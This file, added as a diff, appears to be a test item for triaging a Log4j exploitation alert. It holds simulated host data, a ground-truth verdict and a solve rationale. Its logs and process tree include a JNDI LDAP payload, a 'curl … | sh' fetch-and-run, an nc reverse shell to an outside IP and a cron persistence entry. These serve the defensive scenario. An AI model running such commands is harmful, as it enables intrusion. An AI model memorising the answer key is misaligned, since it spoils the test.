@@ -1,0 +1,78 @@
+{
+  "id": "A-1010",
+  "alert": {
+    "src": "203.0.113.243",
+    "dst": "10.2.4.243",
+    "dst_port": 8080,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Apache Log4j RCE Attempt",
+    "claimed_cve": "CVE-2021-44228",
+    "severity": "high",
+    "ts": "2026-09-13T07:35:00Z",
+    "flow_id": "f6155"
+  },
+  "world": {
+    "assets": {
+      "10.2.4.243": {
+        "host": "host-10-2-4-243",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "8080": {
+            "product": "apache-log4j",
+            "version": "2.16.0"
+          }
+        },
+        "peers": [
+          "10.2.8.46"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2021-44228": {
+        "product": "apache-log4j",
+        "patched_in": "2.17.0",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f6155": {
+        "direction": "outbound",
+        "bytes_out": 84213,
+        "bytes_in": 512,
+        "duration_s": 604,
+        "state": "ESTABLISHED",
+        "note": "periodic 60s beacon to external host"
+      }
+    },
+    "logs": {
+      "host-10-2-4-243": [
+        "[host-10-2-4-243] 8080 POST /api/x 200 jndi:ldap://203.0.113.243/a  <- payload accepted",
+        "[host-10-2-4-243] spawned /bin/sh from service process"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-4-243": {
+        "suspicious": true,
+        "tree": "java -> sh -c 'curl 203.0.113.243|sh' -> nc 203.0.113.243 4444",
+        "persistence": "cron @reboot /tmp/.beacon"
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.243",
+        "dst": "10.2.4.243",
+        "port": 8080,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "SUCCEEDED",
+    "action": "contain"
+  },
+  "adversarial": false,
+  "solve_rationale": "vulnerable version + shell spawned + outbound beacon"
+}
